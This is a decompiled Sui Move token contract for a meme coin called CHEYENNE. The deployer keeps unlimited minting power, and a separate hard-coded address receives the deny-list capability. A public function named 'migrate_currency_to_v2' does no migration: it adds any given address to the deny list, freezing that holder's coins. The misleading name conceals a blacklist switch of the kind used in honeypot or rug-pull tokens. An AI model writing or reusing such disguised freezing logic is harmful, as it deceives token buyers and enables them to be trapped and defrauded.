module 0x44ec9fa7d9dd6bf7cb37982f357fb0cf4caa89fb0bccc21e715eb9443b724704::cheyenne {
    struct CHEYENNE has drop {
        dummy_field: bool,
    }

    public entry fun burn(arg0: &mut 0x2::coin::TreasuryCap<CHEYENNE>, arg1: 0x2::coin::Coin<CHEYENNE>) {
        0x2::coin::burn<CHEYENNE>(arg0, arg1);
    }

    fun init(arg0: CHEYENNE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<CHEYENNE>(arg0, 9, b"CHEYENNE", b"Cheyenne", x"43544f206f662074686520666972737420616e696d616c20696e2050e280994e7574732046726565646f6d204661726d", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://dd.dexscreener.com/ds-data/tokens/solana/UrAE9vVdrWxncikcCRp7TgNqEsArFtP22iXzH7gpump.png?size=xl&key=77ea94")), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<CHEYENNE>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<CHEYENNE>>(v2);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<CHEYENNE>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<CHEYENNE>>(v1, @0xc53a832a950f579deae606b6a1c802b87ba9cb0739653ae21d2b02fad3c47db0);
    }

    public fun migrate_currency_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CHEYENNE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<CHEYENNE>(arg0, arg1, arg2, arg3);
    }

    public entry fun mint(arg0: &mut 0x2::coin::TreasuryCap<CHEYENNE>, arg1: u64, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::mint_and_transfer<CHEYENNE>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

